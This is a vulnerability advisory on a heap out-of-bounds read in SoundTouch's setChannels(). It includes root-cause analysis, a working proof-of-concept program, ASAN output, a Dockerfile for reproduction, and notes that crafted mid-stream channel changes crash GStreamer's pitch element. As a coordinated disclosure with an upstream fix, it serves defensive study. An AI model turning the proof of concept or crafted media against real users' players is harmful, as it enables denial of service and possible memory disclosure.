# Heap OOB Read in SoundTouch FIFOSampleBuffer::setChannels() on Mid-Stream Channel Change

**Reporter**: Olivier Laflamme
**Pwno ID**: [`PWNO-0045-M`](https://bugs.pwno.io/0045)
**Published**: 2026-04-19

## Summary

SoundTouch's `FIFOSampleBuffer::setChannels()` at `FIFOSampleBuffer.cpp:72` recalculates `samplesInBuffer` for the new channel count but does not reset or adjust `bufferPos`. When the channel count increases (e.g., 2 to 16) while `bufferPos > 0` (after `receiveSamples()` has partially consumed the buffer), `ptrBegin()` computes `buffer + bufferPos * NEW_channels`, which overshoots the allocated buffer. Subsequent calls to `rewind()` or `ensureCapacity()` invoke `memmove`/`memcpy` from this wild pointer, producing a heap-buffer-overflow read.

The vulnerability is triggered by calling `SoundTouch::setChannels()` while audio data remains in the processing pipeline. The public API does not document any requirement to clear buffers before changing the channel count.

## Vulnerability Details

**Location:** `source/SoundTouch/FIFOSampleBuffer.cpp`, `setChannels()` (line 72), `rewind()` (line 91), `ensureCapacity()` (line 177)

**Type:** Heap buffer overflow read (CWE-122) via missing state reset (CWE-665)

### The Missing Reset

`FIFOSampleBuffer::setChannels()` adjusts `samplesInBuffer` to preserve the byte count of buffered data under the new channel layout, but never touches `bufferPos`:

```cpp
// FIFOSampleBuffer.cpp:72-81
void FIFOSampleBuffer::setChannels(int numChannels)
{
    uint usedBytes;

    if (!verifyNumberOfChannels(numChannels)) return;

    usedBytes = channels * samplesInBuffer;
    channels = (uint)numChannels;
    samplesInBuffer = usedBytes / channels;
    // BUG: bufferPos is NOT reset or adjusted
}
```

The `bufferPos` field tracks how many samples have been consumed from the front of the buffer. It is advanced by `receiveSamples()` at line 237 (`bufferPos += maxSamples`) and only reset to zero by `rewind()` or `clear()`. After `setChannels()`, every subsequent access through `ptrBegin()` multiplies `bufferPos` by the **new** (larger) channel count:

```cpp
// FIFOSampleBuffer.cpp:148-152
SAMPLETYPE *FIFOSampleBuffer::ptrBegin()
{
    assert(buffer);
    return buffer + bufferPos * channels;  // channels is now the NEW value
}
```

When channels increases from 2 to 16, `ptrBegin()` returns `buffer + bufferPos * 16` instead of `buffer + bufferPos * 2`, overshooting by `bufferPos * (16 - 2)` float elements into unallocated heap.

### The Read Paths

`rewind()` at line 91 and `ensureCapacity()` at line 177 both call `ptrBegin()` as a source address for `memmove`/`memcpy`:

```cpp
// FIFOSampleBuffer.cpp:87-94 — rewind()
void FIFOSampleBuffer::rewind()
{
    if (buffer && bufferPos)
    {
        memmove(buffer, ptrBegin(),                           // source: wild pointer
                sizeof(SAMPLETYPE) * channels * samplesInBuffer);
        bufferPos = 0;
    }
}
```

```cpp
// FIFOSampleBuffer.cpp:175-177 — ensureCapacity(), on reallocation path
if (samplesInBuffer)
{
    memcpy(temp, ptrBegin(),                                  // source: wild pointer
           samplesInBuffer * channels * sizeof(SAMPLETYPE));
}
```

Both read from the wild pointer. The subsequent `putSamples()` call triggers `ptrEnd()` → `ensureCapacity()` → `rewind()`, completing the chain from API call to OOB read.

### Affected Internal Buffers

`SoundTouch::setChannels()` at `SoundTouch.cpp:138-145` propagates the channel change to 5 `FIFOSampleBuffer` instances:

- `TDStretch::inputBuffer` and `TDStretch::outputBuffer`
- `RateTransposer::inputBuffer`, `RateTransposer::midBuffer`, and `RateTransposer::outputBuffer`

Any of these with `bufferPos > 0` at the time of the channel switch will trigger the OOB read. The PoC triggers through `RateTransposer::inputBuffer`.

## Reproduction

Six API calls:

```cpp
#include "SoundTouch.h"
using namespace soundtouch;

int main() {
    SoundTouch st;
    st.setSampleRate(44100);
    st.setTempo(1.3);
    st.setChannels(2);

    float buf[8192] = {};
    float out[8192];

    st.putSamples(buf, 2048);       // fill pipeline
    st.receiveSamples(out, 1024);   // advance bufferPos

    st.setChannels(16);             // bufferPos not reset → ptrBegin overshoots
    st.putSamples(buf, 128);        // triggers ensureCapacity → rewind → OOB read

    return 0;
}
```

### ASAN Output (x86_64, GCC 11, Ubuntu 22.04, Docker)

```
=================================================================
==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x52a00001fa00 at pc 0x7ffffee0ef37 bp 0x7ffffffb3760 sp 0x7ffffffb2f08
READ of size 512 at 0x52a00001fa00 thread T0
    #0 0x7ffffee0ef36 in __interceptor_memmove ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:810
    #1 0x555555563124 in memmove /usr/include/x86_64-linux-gnu/bits/string_fortified.h:36
    #2 0x555555563124 in soundtouch::FIFOSampleBuffer::rewind() /poc/soundtouch/source/SoundTouch/FIFOSampleBuffer.cpp:91
    #3 0x555555563124 in soundtouch::FIFOSampleBuffer::rewind() /poc/soundtouch/source/SoundTouch/FIFOSampleBuffer.cpp:87
    #4 0x555555563124 in soundtouch::FIFOSampleBuffer::ensureCapacity(unsigned int) /poc/soundtouch/source/SoundTouch/FIFOSampleBuffer.cpp:187
    #5 0x555555563124 in soundtouch::FIFOSampleBuffer::ptrEnd(unsigned int) /poc/soundtouch/source/SoundTouch/FIFOSampleBuffer.cpp:136
    #6 0x555555563124 in soundtouch::FIFOSampleBuffer::putSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/FIFOSampleBuffer.cpp:101
    #7 0x555555566bcf in soundtouch::RateTransposer::processSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:137
    #8 0x555555566bcf in soundtouch::RateTransposer::processSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:132
    #9 0x555555566bcf in soundtouch::RateTransposer::putSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/RateTransposer.cpp:124
    #10 0x55555555a910 in soundtouch::SoundTouch::putSamples(float const*, unsigned int) /poc/soundtouch/source/SoundTouch/SoundTouch.cpp:297
    #11 0x555555559d85 in main /poc/poc.cpp:50
    #12 0x7ffffe8a2d8f  (/lib/x86_64-linux-gnu/libc.so.6+0x29d8f)
    #13 0x7ffffe8a2e3f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x29e3f)
    #14 0x55555555a064 in _start (/poc/poc+0x6064)

Address 0x52a00001fa00 is a wild pointer.
SUMMARY: AddressSanitizer: heap-buffer-overflow ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:810 in __interceptor_memmove
Shadow bytes around the buggy address:
  0x0a547fffbef0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf10: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf20: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
=>0x0a547fffbf40:[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x0a547fffbf90: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
  Shadow gap:              cc
==1==ABORTING
```

## Impact

### Crash / Denial of Service

When the channel increase is large (e.g., 2 to 16) and `bufferPos` is significant, `ptrBegin()` computes a pointer that overshoots far enough to land in unmapped memory. The `memmove` in `rewind()` or the `memcpy` in `ensureCapacity()` dereferences this wild pointer, producing a SIGSEGV. This is a reliable, deterministic crash.

### Potential Information Disclosure

With a smaller channel increase (e.g., 2 to 4) where the wild pointer still lands within mapped heap pages, the OOB data is copied into the internal `FIFOSampleBuffer` via `rewind()` or `ensureCapacity()`. This data — which may include heap metadata, adjacent object contents, or freed object remnants — flows through the audio processing pipeline and can be extracted via `receiveSamples()`. An attacker processing audio through a SoundTouch instance they partially control could leak heap contents into the audio output. This info disclosure path has not been verified with a PoC; with the 2-to-16 channel increase in the current PoC, the pointer overshoots into unmapped memory and crashes before any data can be exfiltrated.

### Escalation Analysis

Exhaustive audit of all write paths (`putSamples`, `rewind`, `ensureCapacity`, `TDStretch::overlap*`, `RateTransposer::transpose*`) confirms this is strictly a **read** primitive. All write destinations in `rewind()` and `ensureCapacity()` use `buffer` (the base of the allocation) as the destination, not the wild pointer. The OOB data is read from the wild source address and written to a valid destination.

## Attack Surface

### GStreamer (gst-plugins-bad) — Reachable

The GStreamer `pitch` element wraps SoundTouch. In `gstpitch.cc`, the `gst_pitch_setcaps()` handler calls `priv->st->setChannels()` on caps renegotiation events **without first calling `priv->st->clear()`**. A crafted media file with a mid-stream channel count change (e.g., stereo segment followed by an 8-channel segment) played through any GStreamer application using the `pitch` element triggers this vulnerability without any special application cooperation.

A GStreamer PoC using `appsrc → pitch → fakesink` with a 2-channel-to-8-channel caps switch produces a **SIGSEGV (signal 11, exit code 139)**, confirming the crash is reachable through the GStreamer media pipeline.

### Firefox

Firefox bundles SoundTouch at `media/libsoundtouch/` but applies RLBox WASM sandboxing, limiting exploitation to the sandbox boundary.

### Chromium

Chromium does **not** use SoundTouch. It has its own WSOLA implementation in `media/filters/audio_renderer_algorithm.cc`.

## Proof of Concept Source Code

### poc.cpp

```cpp
/**
 * SoundTouch 2.4.1 — FIFOSampleBuffer::setChannels() heap-buffer-overflow read
 *
 * Root cause: setChannels() recomputes samplesInBuffer for the new channel
 * count but does NOT reset bufferPos. When channels increases and bufferPos > 0:
 *   ptrBegin() = buffer + bufferPos * NEW_channels
 * overshoots the allocated buffer → heap-buffer-overflow read in rewind()
 * (memmove at FIFOSampleBuffer.cpp:91) and ensureCapacity() (memcpy at :177).
 *
 * Affected: SoundTouch 2.0 through 2.4.1 (current HEAD, unfixed)
 * File: source/SoundTouch/FIFOSampleBuffer.cpp
 * CWE-122 | CVSS 3.1: 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)
 *
 * Build:
 *   # Build SoundTouch with ASAN
 *   cd soundtouch && cmake -B build \
 *     -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O2" \
 *     && cmake --build build
 *
 *   # Compile PoC
 *   g++ -fsanitize=address -fno-omit-frame-pointer -g -O2 -std=c++17 \
 *     -I soundtouch/include -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
 *     poc.cpp soundtouch/build/libSoundTouch.a -o poc -lm
 *   ./poc
 */

#include <cstdio>
#include <cstring>
#include "SoundTouch.h"

using namespace soundtouch;

int main() {
    SoundTouch st;
    st.setSampleRate(44100);
    st.setTempo(1.3);
    st.setChannels(2);

    float buf[8192] = {};
    float out[8192];

    // Fill pipeline and advance bufferPos via receiveSamples
    st.putSamples(buf, 2048);
    st.receiveSamples(out, 1024);

    // Switch to higher channel count — bufferPos not reset
    st.setChannels(16);

    // Next putSamples triggers ensureCapacity → rewind → OOB read
    st.putSamples(buf, 128);

    return 0;
}
```

### Dockerfile

```dockerfile
FROM --platform=linux/amd64 ubuntu:22.04
ENV DEBIAN_FRONTEND=noninteractive

RUN apt-get update && apt-get install -y \
      build-essential cmake pkg-config wget \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /poc
COPY poc.cpp ./

# Build SoundTouch from source with ASAN
RUN wget -q https://codeberg.org/soundtouch/soundtouch/archive/master.tar.gz \
      -O soundtouch.tar.gz && \
    tar xzf soundtouch.tar.gz && \
    cd soundtouch && \
    cmake -B build \
      -DCMAKE_CXX_STANDARD=17 \
      -DCMAKE_CXX_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O2" \
      -DCMAKE_C_FLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O2" \
      -DCMAKE_INSTALL_PREFIX=/usr && \
    cmake --build build -j$(nproc) && \
    cd ..

# Build PoC
RUN g++ -o poc poc.cpp \
    -Isoundtouch/include \
    -DSOUNDTOUCH_FLOAT_SAMPLES=1 \
    soundtouch/build/libSoundTouch.a \
    -fsanitize=address -fno-omit-frame-pointer -g -O2 \
    -lm

CMD ["./poc"]
```

### Docker Reproduction

```bash
docker build --platform linux/amd64 -t soundtouch-oob .
docker run --platform linux/amd64 --rm soundtouch-oob
```

## Fix

Fixed in commit `f738b1132ec1fd56efc90367898244cf52d9e6a5` ("Add sanity check to rate value. Clear buffers when change nr of channels") on 2026-04-19, modifying `FIFOSampleBuffer.cpp` to clear buffers when changing the channel count.

The suggested fix was to call `rewind()` before recalculating `samplesInBuffer`, consolidating data at the buffer start and resetting `bufferPos` to 0:

```cpp
void FIFOSampleBuffer::setChannels(int numChannels)
{
    uint usedBytes;

    if (!verifyNumberOfChannels(numChannels)) return;

    rewind();  // consolidate data at buffer start, reset bufferPos to 0

    usedBytes = channels * samplesInBuffer;
    channels = (uint)numChannels;
    samplesInBuffer = usedBytes / channels;
}
```

The maintainer chose the more aggressive approach — clearing all buffered data on channel change.

## Timeline

- **2026-04-06:** Vulnerability discovered and validated with ASAN in Docker (x86_64, GCC 11, Ubuntu 22.04)
- **2026-04-07:** GStreamer reachability confirmed via `appsrc → pitch → fakesink` PoC
- **2026-04-08:** Reported to SoundTouch maintainer via email
- **2026-04-19:** Fixed upstream in commit `f738b113`
